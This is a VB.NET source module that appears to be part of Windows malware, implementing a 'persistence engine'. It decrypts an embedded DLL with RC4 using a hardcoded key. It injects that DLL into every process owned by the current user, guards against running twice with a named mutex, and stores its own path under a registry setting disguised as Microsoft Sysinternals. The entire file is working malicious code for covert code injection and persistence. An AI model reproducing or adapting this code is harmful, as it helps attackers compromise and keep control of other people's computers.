Imports System.Runtime.InteropServices
Imports System.Security.Principal
Imports System.IO
Imports InjectionLibrary
Imports JLibrary.PortableExecutable


Module Injection
    ' Methods
    <DllImport("kernel32.dll", SetLastError:=True)> _
    Public Function CloseHandle(ByVal hObject As IntPtr) As <MarshalAs(UnmanagedType.Bool)> Boolean
    End Function

    Public Sub DllPersistence(ByVal Pid As Integer)
        If Not InjectionIsRunning() Then
            Dim method As InjectionMethod = InjectionMethod.Create(2)
            Dim zero As IntPtr = IntPtr.Zero
            Using executable As PortableExecutable = New PortableExecutable(Proper_RC4(My.Resources.A, System.Text.Encoding.UTF8.GetBytes("activationbitch")))
                zero = method.Inject(executable, Pid)
            End Using
            If Not (zero <> IntPtr.Zero) Then
                method.GetLastError()
            End If
        End If
    End Sub

    Public Function GetCurrentProcessOwner(ByVal processHandle As IntPtr) As String
        Dim str As String
        Dim zero As IntPtr = IntPtr.Zero
        Try
            OpenProcessToken(processHandle, TOKEN_QUERY, zero)
            Dim identity As New WindowsIdentity(zero)
            str = identity.Name.Substring((identity.Name.IndexOf("\") + 1))
        Catch exception1 As Exception
            Dim exception As Exception = exception1
            Throw exception
        Finally
            If (zero <> IntPtr.Zero) Then
                CloseHandle(zero)
            End If
        End Try
        Return str
    End Function
    Public Function InjectionIsRunning() As Boolean
        Dim hObject As IntPtr = OpenMutex(&H1F0001, False, "83729184726481")
        CloseHandle(hObject)
        If (hObject = IntPtr.Zero) Then
            Return False
        End If
        Return True
    End Function

    Public Sub LoadPersitenceEngine()

        Try
            If Not InjectionIsRunning() Then
                SaveSetting("Microsoft", "Sysinternals", "9481", Application.ExecutablePath)
                Dim processes As Process() = Process.GetProcesses
                Dim num2 As Integer = (processes.Length - 1)
                Dim i As Integer = 0
                Do While (i <= num2)
                    Dim process As Process = processes(i)
                    Try
                        Dim x = IO.Path.GetFullPath(process.MainModule.FileName) & process.Id.ToString
                        If (GetCurrentProcessOwner(process.Handle) = Environment.UserName) Then
                            DllPersistence(process.Id)
                        End If
                    Catch exception1 As Exception
                    End Try
                    i += 1
                Loop
            End If
        Catch : End Try

    End Sub

    <DllImport("kernel32.dll")> _
    Private Function OpenMutex(ByVal dwDesiredAccess As UInt32, ByVal bInheritHandle As Boolean, ByVal lpName As String) As IntPtr
    End Function

    <DllImport("advapi32.dll", SetLastError:=True)> _
    Private Function OpenProcessToken(ByVal ProcessHandle As IntPtr, ByVal DesiredAccess As UInt32, ByRef TokenHandle As IntPtr) As Boolean
    End Function
    ' Fields
    Private TOKEN_QUERY As UInt32 = 8
End Module
